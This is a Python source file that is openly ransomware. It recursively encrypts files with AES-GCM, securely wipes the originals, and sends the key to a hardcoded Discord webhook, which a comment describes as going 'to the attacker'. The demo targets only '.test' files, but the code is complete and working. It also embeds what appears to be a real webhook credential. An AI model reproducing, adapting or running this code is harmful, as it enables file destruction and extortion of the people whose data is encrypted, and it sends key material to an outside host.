from cryptography.hazmat.primitives.ciphers.aead import AESGCM          # AESGCM protocol suite

from typing import List
import requests
import secrets
import base64
import os

def send_data(data: str) -> bool:
    """
    Send data to the server(Discord) and check if it succeeded.

    :param data: The data to send.
    :return: True if the data was sent successfully, False otherwise.
    """
    webhook_url = "https://discord.com/api/webhooks/1313875651220082710/RV3tyN3A4h6sxxepIYgc8FoyXc3dROpZJQGYtXlDdZqytgT8hcpnYLBf4RqoKdLMOvym"

    payload = {
        "content": data
    }

    try:
        response = requests.post(webhook_url, json=payload)
        response.raise_for_status()
        if response.status_code != 204:
            raise requests.exceptions.RequestException(f"Received status code {response.status_code} from Discord, expected 204.")
        return True
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
        return False

def encrypt_file(filepath: str, key: bytes) -> None:
    """
    A function to encrypt a single file using AES-GCM encryption with the given key.

    :param filepath: The path to the file to encrypt.
    :param key: The key to use for encryption.
    """
    try:
        with open(filepath, "rb") as file:
            data = file.read()

        # Create a AES-GCM cipher object, including 12-bytes-length nonce
        aesgcm = AESGCM(key)
        nonce  = secrets.token_bytes(12)

        ciphertext = aesgcm.encrypt(nonce, data, None)
        encrypted_filepath = f"{filepath}.enc"
        with open(encrypted_filepath, "wb") as file:
            file.write(nonce + ciphertext)
        print(f"Successfully encrypted {filepath} to {encrypted_filepath}.")
    except Exception as e:
        print(f"An error occurred while encrypting {filepath}: {e}")

def wipe_file(filepath: str) -> None:
    """
    Overwrite the file content with 0s and delete to completely wipe it.
    This strategy is used to prevent data recovery, especially for HDDs.

    :param filepath: The path to the file to wipe.
    """
    try:
        with open(filepath, "r+b") as file:
            file.seek(0)
            file.write(b"\x00" * os.path.getsize(filepath))
            file.truncate()
        os.remove(filepath)
        print(f"Successfully wiped {filepath}.")
    except Exception as e:
        print(f"An error occurred while wiping {filepath}: {e}")

def encrypt_directory_walk(directory: str, key: bytes, extensions: List[str]) -> None:
    """
    Recursively walk through a directory and encrypt all files in it.
    :param directory: The path to the directory to walk through.
    :param key: The key to use for encryption.
    """
    # Directory must exist
    if not os.path.exists(directory):
        print(f"Directory {directory} does not exist.")
        return

    assert len(extensions) > 0, "At least one extension must be provided."

    try:
        for root, _, files in os.walk(directory):
            for file in files:
                filepath = os.path.join(root, file)
                if filepath.endswith(tuple(extensions)):
                    encrypt_file(filepath, key) 
                    wipe_file(filepath)
    except os.error as e:
        print(f"An error occurred while walking through {directory}: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")

def generate_key() -> bytes:
    """
    Generate a random 256-bit key for AES-GCM encryption.
    
    :return: The generated key.
    """
    return secrets.token_bytes(32)

if __name__ == "__main__":
    # Generate a random key for AES-GCM encryption
    key = generate_key()

    # Encrypt all files in the current directory with the given extensions
    directory = "."
    extension_list = [".test"]
    encrypt_directory_walk(directory, key, extension_list)
    
    # Send the key to the attacker in an hexadecimal format
    key_hex = key.hex()
    if send_data(key_hex):
        print("Key sent successfully.")
    else:
        print("Failed to send key.")
